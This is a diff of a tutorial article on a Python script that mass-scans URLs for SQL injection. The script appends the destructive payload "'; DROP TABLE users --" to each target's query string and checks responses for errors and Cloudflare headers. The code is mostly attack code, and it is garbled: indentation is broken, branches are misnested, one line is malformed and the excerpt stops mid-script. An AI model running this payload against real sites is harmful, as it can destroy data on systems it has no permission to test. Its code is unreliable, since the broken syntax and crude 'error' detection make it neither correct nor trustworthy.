@@ -16,65 +16,65 @@ Here's a brief overview of how the script works:
 It takes a list of URLs as input, either from a file or as a single URL. For each URL, it checks for SQL  Injection vulnerabilities by appending a payload to the URL's query parameter. It analyzes the response for  signs of SQL Injection and Cloudflare protection. The script displays the results in the terminal.
 
 Step 2:Script Implementation
-Let's break down the script step by step: Import the necessary modules:
+# Let's break down the script step by step: Import the necessary modules:
 
-import sys
-import requests
-import urllib.parse
-from urllib3.exceptions import NewConnectionError, MaxRetryError, ConnectTimeoutError
+
+    import sys
+    import requests
+    import urllib.parse
+    from urllib3.exceptions import NewConnectionError, MaxRetryError, ConnectTimeoutError
 
 
 # Define the SQL Injection payload (modify as needed):
 
 
-payload = "'; DROP TABLE users --"
+    payload = "'; DROP TABLE users --"
+
 # Create a function check_sql_injection(url) to check SQL Injection for a given URL:
+    def check_sql_injection(url):
+        try:
 
-def check_sql_injection(url):
+# Check if the URL has a scheme (http:// or https://)
+            if not url.startswith("http://") and not url.startswith("https://"):
 
- try:
-
- # Check if the URL has a scheme (http:// or https://)
-if not url.startswith("http://") and not url.startswith("https://"):
-
- # Add "https://" if no scheme is specified
- url = "https://" + url 
+# Add "https://" if no scheme is specified
+                url = "https://" + url 
 
  # Encode the SQL injection payload
-encoded_payload = urllib.parse.quote(payload)
+            encoded_payload = urllib.parse.quote(payload)
 
  # Append the encoded payload as a query parameter
-target_url = f"{url}?q={encoded_payload}"
+            target_url = f"{url}?q={encoded_payload}"
 
  # Send an HTTP GET request to the modified URL with a timeout
-response = requests.get(target_url, timeout=10)
+            response = requests.get(target_url, timeout=10)
 
  # Check for Cloudflare protection and SQL Injection signs in the response
 
-if "Server" in response.headers and "cloudflare" in response.headers["Server"].lower():
-    print(f"Cloudflare Protection Detected for {url}")
-else:
-    if "error" in response.text.lower():
-        print(f"Possible SQL Injection Detected for {url}")
-    else:
-        print(f"No SQL Injection Detected for {url}")
+            if "Server" in response.headers and "cloudflare" in response.headers["Server"].lower():
+                print(f"Cloudflare Protection Detected for {url}")
+            else:
+                if "error" in response.text.lower():
+                print(f"Possible SQL Injection Detected for {url}")
+            else:
+                print(f"No SQL Injection Detected for {url}")
 
- except (NewConnectionError, MaxRetryError, ConnectTimeoutError):
-     print(f"Connection Error:Skipping {url}")
- except requests.exceptions.ConnectionError:
-     print(f"Connection Error:Skipping {url}")
+    except (NewConnectionError, MaxRetryError, ConnectTimeoutError):
+        print(f"Connection Error:Skipping {url}")
+    except requests.exceptions.ConnectionError:
+        print(f"Connection Error:Skipping {url}")
 
 # Check the command-line arguments and process the input:
 
 
-if len(sys.argv) < 2>")
-    print("Usage: python script.py <URL or file>")
-    sys.exit(1)
+    if len(sys.argv) < 2>")
+        print("Usage: python script.py <URL or file>")
+        sys.exit(1)
 
 # Get the URL or file name from the command-line argument
- input_arg = sys.argv[1]
- 
- if input_arg.endswith(".txt"):
+    input_arg = sys.argv[1]
+    if input_arg.endswith(".txt"):
+    
  # Read URLs from the file
      with open(input_arg, "r") as file:
          urls = [line.strip() for line in file]
